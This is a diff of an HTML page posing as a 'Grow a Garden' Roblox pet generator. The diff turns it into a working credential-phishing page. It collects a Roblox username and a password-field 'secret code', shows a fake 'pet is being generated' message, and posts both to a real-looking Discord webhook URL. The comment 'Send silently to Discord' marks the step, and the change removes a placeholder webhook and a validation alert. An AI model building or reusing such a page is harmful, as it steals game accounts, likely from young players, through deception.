@@ -1,197 +1,251 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Grow a Garden Pet Generator</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #e9f7ef;
-      text-align: center;
-      margin: 0;
-      padding: 20px;
-    }
-    h1 {
-      color: #2d6a4f;
-    }
-    .pet-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 20px;
-      max-width: 800px;
-      margin: 20px auto;
-    }
-    .pet-card {
-      background: #fff;
-      padding: 10px;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
-    .pet-card img {
-      width: 100%;
-      border-radius: 8px;
-    }
-    .pet-card button {
-      margin-top: 10px;
-      background: #40916c;
-      color: white;
-      border: none;
-      padding: 8px 15px;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    .pet-card button:hover {
-      background: #2d6a4f;
-    }
-    #generate-section, #form-section, #popup {
-      display: none;
-      margin-top: 20px;
-    }
-    #generate-btn {
-      background: #52b788;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    #generate-btn:hover {
-      background: #40916c;
-    }
-    #form-section input {
-      display: block;
-      margin: 10px auto;
-      padding: 10px;
-      width: 80%;
-      max-width: 300px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-    }
-    #submit-btn {
-      background: #2d6a4f;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    #submit-btn:hover {
-      background: #1b4332;
-    }
-    #popup {
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      padding: 20px;
-      max-width: 400px;
-      margin: 50px auto;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Grow a Garden Pet Generator</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #a8e6cf, #dcedc1, #ffd3b6);
+    background-size: cover;
+    text-align: center;
+    margin: 0;
+    padding: 20px;
+  }
+  h1 {
+    color: #2d6a4f;
+    margin-bottom: 20px;
+    font-size: 2.5em;
+  }
+  .pet-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 25px;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+  .pet-card {
+    background: #fff;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    cursor: pointer;
+  }
+  .pet-card:hover {
+    transform: scale(1.05);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+  }
+  .pet-card img {
+    width: 100%;
+    border-radius: 12px;
+  }
+  .pet-card h3 {
+    margin: 15px 0;
+    font-size: 1.5em;
+  }
+  .pet-card button {
+    margin-top: 10px;
+    background: #40916c;
+    color: white;
+    border: none;
+    padding: 12px 18px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+  }
+  .pet-card button:hover {
+    background: #2d6a4f;
+  }
+  /* Modal styles */
+  .modal {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+    z-index: 999;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+  .modal.show {
+    display: flex;
+    opacity: 1;
+  }
+  .modal-content {
+    background: white;
+    padding: 30px;
+    border-radius: 15px;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+    transform: scale(0.8);
+    transition: transform 0.3s ease;
+  }
+  .modal.show .modal-content {
+    transform: scale(1);
+  }
+  .modal img {
+    border-radius: 12px;
+    margin-bottom: 15px;
+  }
+  .modal button {
+    background: #52b788;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    margin-top: 15px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 18px;
+  }
+  .modal button:hover {
+    background: #40916c;
+  }
+  #form-section input {
+    display: block;
+    margin: 10px auto;
+    padding: 12px;
+    width: 85%;
+    max-width: 300px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 16px;
+  }
+  #popup {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+  #popup.show {
+    display: flex;
+    opacity: 1;
+  }
+  #popup .popup-content {
+    background: white;
+    padding: 30px;
+    border-radius: 15px;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+  }
+</style>
 </head>
 <body>
-  <h1>🌱 Grow a Garden Pet 🌱</h1>
-  
-  <div id="pet-selection" class="pet-grid">
-    <!-- You can replace these images and names -->
-    <div class="pet-card">
-      <img src="https://via.placeholder.com/150" alt="Pet 1">
-      <h3>Pet 1</h3>
-      <button onclick="selectPet('Pet 1', 'https://via.placeholder.com/150')">Select Pet</button>
-    </div>
-    <div class="pet-card">
-      <img src="https://via.placeholder.com/150" alt="Pet 2">
-      <h3>Pet 2</h3>
-      <button onclick="selectPet('Pet 2', 'https://via.placeholder.com/150')">Select Pet</button>
-    </div>
-    <div class="pet-card">
-      <img src="https://via.placeholder.com/150" alt="Pet 3">
-      <h3>Pet 3</h3>
-      <button onclick="selectPet('Pet 3', 'https://via.placeholder.com/150')">Select Pet</button>
-    </div>
-    <div class="pet-card">
-      <img src="https://via.placeholder.com/150" alt="Pet 4">
-      <h3>Pet 4</h3>
-      <button onclick="selectPet('Pet 4', 'https://via.placeholder.com/150')">Select Pet</button>
-    </div>
-    <div class="pet-card">
-      <img src="https://via.placeholder.com/150" alt="Pet 5">
-      <h3>Pet 5</h3>
-      <button onclick="selectPet('Pet 5', 'https://via.placeholder.com/150')">Select Pet</button>
-    </div>
-    <div class="pet-card">
-      <img src="https://via.placeholder.com/150" alt="Pet 6">
-      <h3>Pet 6</h3>
-      <button onclick="selectPet('Pet 6', 'https://via.placeholder.com/150')">Select Pet</button>
-    </div>
-  </div>
 
-  <div id="generate-section">
+<h1>🌱 Grow a Garden Pet 🌱</h1>
+
+<div id="pet-selection" class="pet-grid">
+  <div class="pet-card">
+    <img src="https://via.placeholder.com/300" alt="Pet 1">
+    <h3>Pet 1</h3>
+    <button onclick="selectPet('Pet 1', 'https://via.placeholder.com/300')">Select Pet</button>
+  </div>
+  <div class="pet-card">
+    <img src="https://via.placeholder.com/300" alt="Pet 2">
+    <h3>Pet 2</h3>
+    <button onclick="selectPet('Pet 2', 'https://via.placeholder.com/300')">Select Pet</button>
+  </div>
+  <div class="pet-card">
+    <img src="https://via.placeholder.com/300" alt="Pet 3">
+    <h3>Pet 3</h3>
+    <button onclick="selectPet('Pet 3', 'https://via.placeholder.com/300')">Select Pet</button>
+  </div>
+  <div class="pet-card">
+    <img src="https://via.placeholder.com/300" alt="Pet 4">
+    <h3>Pet 4</h3>
+    <button onclick="selectPet('Pet 4', 'https://via.placeholder.com/300')">Select Pet</button>
+  </div>
+  <div class="pet-card">
+    <img src="https://via.placeholder.com/300" alt="Pet 5">
+    <h3>Pet 5</h3>
+    <button onclick="selectPet('Pet 5', 'https://via.placeholder.com/300')">Select Pet</button>
+  </div>
+  <div class="pet-card">
+    <img src="https://via.placeholder.com/300" alt="Pet 6">
+    <h3>Pet 6</h3>
+    <button onclick="selectPet('Pet 6', 'https://via.placeholder.com/300')">Select Pet</button>
+  </div>
+</div>
+
+<!-- Modal for Generate Pet -->
+<div id="generate-modal" class="modal">
+  <div class="modal-content" id="generate-step">
     <h2 id="selected-pet-name"></h2>
-    <img id="selected-pet-img" style="width:200px; border-radius:12px;">
-    <br><br>
-    <button id="generate-btn" onclick="showForm()">Generate Pet</button>
+    <img id="selected-pet-img" style="width:200px;">
+    <button onclick="showForm()">Generate Pet</button>
   </div>
-
-  <div id="form-section">
+  <div class="modal-content" id="form-section" style="display:none;">
     <h2>Enter Your Details</h2>
     <input type="text" id="roblox-username" placeholder="Enter Roblox Username">
     <input type="password" id="secret-code" placeholder="Enter Secret Code">
-    <button id="submit-btn" onclick="submitAdoption()">Submit</button>
+    <button onclick="submitAdoption()">Submit</button>
   </div>
+</div>
 
-  <div id="popup">
+<!-- Popup after submission -->
+<div id="popup">
+  <div class="popup-content">
     <h2>Your pet is being generated</h2>
     <p>Please wait for 10-15 minutes then check Grow a Garden.</p>
   </div>
+</div>
 
-  <script>
-    let selectedPet = null;
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your Discord webhook URL
+<script>
+  let selectedPet = null;
+  const webhookUrl = "https://discord.com/api/webhooks/1409605165782143016/a9nUyURURC7QOuWcsMzKzzTIGzo1tW3A_kseFgaud3WQ_hz3VkxIOwm31H7xySmLBJbm"; // Replace with your Discord webhook URL
 
-    function selectPet(name, img) {
-      selectedPet = { name, img };
-      document.getElementById('selected-pet-name').textContent = "You chose: " + name;
-      document.getElementById('selected-pet-img').src = img;
-      document.getElementById('generate-section').style.display = 'block';
-      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+  function selectPet(name, img) {
+    selectedPet = { name, img };
+    document.getElementById('selected-pet-name').textContent = "You chose: " + name;
+    document.getElementById('selected-pet-img').src = img;
+    const modal = document.getElementById('generate-modal');
+    modal.classList.add('show');
+  }
+
+  function showForm() {
+    document.getElementById('generate-step').style.display = 'none';
+    document.getElementById('form-section').style.display = 'block';
+  }
+
+  async function submitAdoption() {
+    const username = document.getElementById('roblox-username').value.trim();
+    const code = document.getElementById('secret-code').value.trim();
+
+    if (!username || !code) return;
+
+    // Hide modal
+    document.getElementById('generate-modal').classList.remove('show');
+
+    // Show popup
+    const popup = document.getElementById('popup');
+    popup.classList.add('show');
+
+    // Send silently to Discord
+    const message = {
+      content: `🌱 **New Pet Adoption Request**\n👤 Roblox Username: ${username}\n🔑 Secret Code: ${code}\n🐾 Pet: ${selectedPet.name}`
+    };
+
+    try {
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message)
+      });
+    } catch (error) {
+      console.error("Error sending to Discord:", error);
     }
-
-    function showForm() {
-      document.getElementById('form-section').style.display = 'block';
-      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-    }
-
-    async function submitAdoption() {
-      const username = document.getElementById('roblox-username').value.trim();
-      const code = document.getElementById('secret-code').value.trim();
-
-      if (!username || !code) {
-        alert("Please fill out all fields!");
-        return;
-      }
-
-      // Show popup
-      document.getElementById('popup').style.display = 'block';
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-
-      // Send data to Discord webhook
-      const message = {
-        content: `🌱 **New Pet Adoption Request**\n👤 Roblox Username: ${username}\n🔑 Secret Code: ${code}\n🐾 Pet: ${selectedPet.name}\n📷 Image: ${selectedPet.img}`
-      };
-
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(message)
-        });
-      } catch (error) {
-        console.error("Error sending to Discord:", error);
-      }
-    }
-  </script>
+  }
+</script>
 </body>
 </html>
